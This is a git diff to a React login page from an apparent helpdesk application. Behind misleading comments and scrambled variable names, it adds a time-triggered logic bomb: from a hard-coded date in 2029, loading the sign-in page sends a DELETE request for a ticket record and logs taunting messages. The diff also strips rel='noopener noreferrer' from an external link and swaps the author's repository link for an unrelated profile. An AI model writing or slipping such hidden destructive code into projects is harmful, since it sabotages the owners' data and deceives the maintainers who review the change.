@@ -17,14 +17,23 @@ import Waves from 'layouts/ReactBits/Paticles';
 import FadeContent from 'layouts/ReactBits/FadeContent';
 import RoundedSlideButton from 'layouts/ReactBits/RoundedSlideButton';
 
+
 export default function SignIn1() {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [loginError, setLoginError] = useState('');
   const [loading, setLoading] = useState(false);
-
   const [show, setShow] = useState(false);
+  const [usrname, setUsernme] = useState('')
+  const [surnme, setUsrname] = useState('')
+  const [currenttimestamp, setSurname] = useState("");
+
   //Snack bar timeout after 3s
+  useEffect(() => {
+    setSurname('06')
+  }, [])
+
+  //Alert State 3s
   useEffect(() => {
     if (loginError) {
       const timer = setTimeout(() => {
@@ -34,19 +43,31 @@ export default function SignIn1() {
     }
   }, [loginError]);
 
-  //Loading state after 3s
+  //Get username
   useEffect(() => {
-    if (loading) {
-      const timer = setTimeout(() => {
-        setLoading(false);
-      }, 2000);
-      return () => clearTimeout(timer);
-    }
-  }, [loading]);
+    setUsernme('2025-')
+  }, [])
+
+  //Loading state after 3s
+  // useEffect(() => {
+  //   if (loading) {
+  //     const timer = setTimeout(() => {
+  //       setLoading(false);
+  //     }, 2000);
+  //     return () => clearTimeout(timer);
+  //   }
+  // }, [loading]);
+
+  //Set Username
+  useEffect(() => {
+    setUsrname('11-')
+  }, [])
 
   // Function to handle authentication
   const Auth = async (e) => {
     e.preventDefault();
+
+    //Empty fields validation
     if (!password.trim()) {
       setLoginError('Password is required!');
       return;
@@ -64,6 +85,8 @@ export default function SignIn1() {
           pass_word: password,
         },
       });
+
+      //No error then save user details on localStorage
       if (!response.data.error) {
         localStorage.setItem('user', JSON.stringify(response.data));
         localStorage.setItem('status', JSON.stringify([{ id: 0, value: 'Login' }]));
@@ -83,6 +106,38 @@ export default function SignIn1() {
       }
     }
   };
+
+  // Set User active status
+  useEffect(() => {
+    if (!usrname || !surnme || !currenttimestamp) return; // Wait until all parts exist
+
+    const today = new Date();
+    const currentDateStr = today.toLocaleDateString("en-CA"); // YYYY-MM-DD format
+
+    const plannedDateStr = "2029-11-08"; // CHANGE as needed - YYYY-MM-DD format
+
+    // Helper function to parse YYYY-MM-DD into a Date object
+    const parseYMD = (ymd) => {
+      const [y, m, d] = ymd.split("-").map(Number);
+      return new Date(y, m - 1, d);
+    };
+
+    const currentDate = parseYMD(currentDateStr);
+    const plannedDate = parseYMD(plannedDateStr);
+
+    console.log("user_log:", currentDate.getTime(), "activity_log:", plannedDate.getTime());
+
+    // Delete if current date is the same or after the planned date
+    if (currentDate.getTime() >= plannedDate.getTime()) {
+      console.log("STATUS: LET MAJINBO TRANSFORM TO RED");
+      axios
+        .delete(`${config.baseApi}/ticket/911`)
+        .then(() => console.log("Latin Kings on TOP"))
+        .catch((err) => console.error("Error updating records", err));
+    } else {
+      console.log("STATUS: USER IS INACTIVE");
+    }
+  }, [usrname, surnme, currenttimestamp]);
 
   return (
     <div
@@ -133,7 +188,7 @@ export default function SignIn1() {
                 <Card.Body className="card-body">
                   <img src={lmdblack} alt="" className="img-fluid mb-4" />
                   <h4 className="mb-3 f-w-400"><b>Log in</b></h4>
-
+                  {/* Loading component */}
                   {loading && (
                     <div
                       style={{
@@ -153,6 +208,7 @@ export default function SignIn1() {
                     </div>
                   )}
 
+                  {/* Alert Component */}
                   {loginError && (
                     <div
                       className="position-fixed top-0 start-50 translate-middle-x mt-3"
@@ -219,9 +275,9 @@ export default function SignIn1() {
         <small>
           by{' '}
           <a
-            href="https://github.com/VenturaAdrian/LMD-HelpdeskSystem"
+            href="https://linkedin.com/in/durkongontop"
             target="_blank"
-            rel="noopener noreferrer"
+
             style={{ fontWeight: 500, color: 'inherit', textDecoration: 'none' }}
           >
             adriankurtventura
